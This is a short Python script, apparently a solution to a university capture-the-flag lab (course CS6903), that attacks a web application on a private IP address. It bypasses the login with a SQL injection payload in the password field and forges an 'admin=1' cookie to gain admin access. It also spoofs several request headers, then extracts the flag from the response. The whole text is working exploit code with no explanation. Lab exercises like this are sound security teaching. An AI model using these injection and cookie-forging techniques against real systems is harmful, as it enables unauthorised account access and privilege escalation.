import requests
import urllib3
import re

urllib3.disable_warnings()

BASE  = 'https://10.9.96.228:9070'
EMAIL = 'cs25mtech14003@iith.ac.in'


session = requests.Session()

session.post(BASE + '/', data={
    'login_email': EMAIL,
    'login_pass':  f"' OR email='{EMAIL}' #",
    'login':       'Login'
}, verify=False)

session.cookies.set('admin', '1')

r = session.get(
    BASE + '/',
    params={'p': 'apps', 'f': '2'},
    headers={
        'User-Agent': 'CS6903',
        'Referer':    'newslab.cse.iith.ac.in',
        'DNT':        '1',
        'X-UIDH':     'surya',
    },
    verify=False
)

flag = re.search(r'cs6903\{[^}]+\}', r.text)
if flag:
    print(flag.group(0))
else:
    for key, val in r.headers.items():
        if 'cs6903' in val.lower() or 'flag' in key.lower():
            print(f"{key}: {val}")